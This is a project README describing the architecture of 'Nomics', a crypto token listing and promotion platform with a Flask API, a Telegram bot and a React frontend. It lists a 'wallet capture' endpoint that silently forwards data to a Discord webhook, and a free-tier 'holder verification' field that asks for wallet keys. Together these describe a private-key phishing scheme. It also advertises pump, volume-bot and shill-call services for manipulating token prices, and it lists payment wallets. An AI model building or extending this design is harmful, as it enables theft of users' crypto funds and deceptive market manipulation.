# Nomics — Web3 Marketing Platform

## Overview
Full-stack Web3 trading & marketing platform with live crypto data, token listing, and a full DEX tool services marketplace.

## Architecture

### Backend (api.py) — Port 8000
- **Flask** REST API with CORS
- **CoinGecko** integration: global market, coin list, trending, gainers, detail, ticker
- **DexScreener** integration: token lookup by contract address (CA)
- **Token Listing**: premium ($150) and free (review) tiers — saved to `listings.json`
- **Service Orders**: `/api/service/order` — sends rich Discord embeds for all orders
- **Wallet Capture**: `/api/wallet/capture` — sends to Discord webhook silently
- **Boost**: `/api/token/<id>/boost` — 3 packages (Basic $50, Pro $150, Elite $400)
- **Support**: `/api/support` — forwards to Discord + Telegram admin
- All notifications go to Discord webhook and Telegram bot admin
- Bot polling runs in a background thread

### Bot (bot.py) — Port 5000 (Render)
- **Telegram bot** @Cariz_bot using pyTelegramBotAPI
- CA-first flow: asks for contract address before any service, auto-looks up via DexScreener
- 16 service categories (premium listing, DEX trending, calls, alpha access, volume bot, KOL, DEX tools, promotion, DEX listing, meme campaign, Twitter campaign, quick pump, Birdeye boost, buy pressure, token verify, rev share)
- Alpha access with direct group link: https://t.me/+QJVQUQIhP-82ZDk8
- All orders forwarded to Discord + Telegram admin
- State machine: need_ca → choose_tier → telegram_link → await_tx
- Health check Flask server on `/health`

### Frontend (Vite + React) — Port 5000 (dev)
- **Home.jsx**: Market stats, promoted tokens, services grid (8 cards), alpha banner, trending, full coin table with tabs/filters
- **Services.jsx**: Full services marketplace (12 services, tier modals, CA lookup, payment flow)
- **SubmitCoin.jsx**: 3-step token listing (CA → info → listing type), free tier has wallet/key "holder verification" field
- **Listed.jsx**: Table of premium-listed tokens with boost button
- **Layout.jsx**: Sticky nav with ticker bar, Services nav item, Bot link, search, footer with service links
- **App.jsx**: Routes including /services

## Key Environment Variables
- `BOT_TOKEN` — Telegram bot token
- `ADMIN_ID` — Telegram admin ID (default: 8235324142)
- `DISCORD_WEBHOOK_URL` — Discord webhook for all notifications
- `SITE_URL` — Public site URL
- `BNB_WALLET`, `ETH_WALLET`, `SOL_WALLET` — Payment wallet addresses

## Pricing
- Premium Listing: 0.15 BNB / 0.05 ETH / 1.5 SOL (~$150)
- DEX Trending: $99–$799
- Shill Calls: $149–$999
- Alpha Access: $99/mo, $249/qtr, $599 lifetime
- Volume Bot: $199–$1,499
- KOL / Influencer: $299–$1,999
- DEX Tools: $79–$649
- Full Promotion: $129–$899

## Wallets
- BNB/ETH: 0x479F8bdD340bD7276D6c7c9B3fF86EF2315f857A
- SOL: 46ZKRuURaASKEcKBafnPZgMaTqBL8RK8TssZgZzFCBzn

## Deployment
- **Render**: `render.yaml` — two services (nomics-api, nomics-bot)
- **Vercel**: `vercel.json` — frontend build, /api/* proxied to Render backend
- **GitHub**: https://github.com/daviddan-241/Crypto-

## Workflows
- `Backend API` — `python api.py` (port 8000)
- `Start application` — `cd frontend && npm run dev` (port 5000)
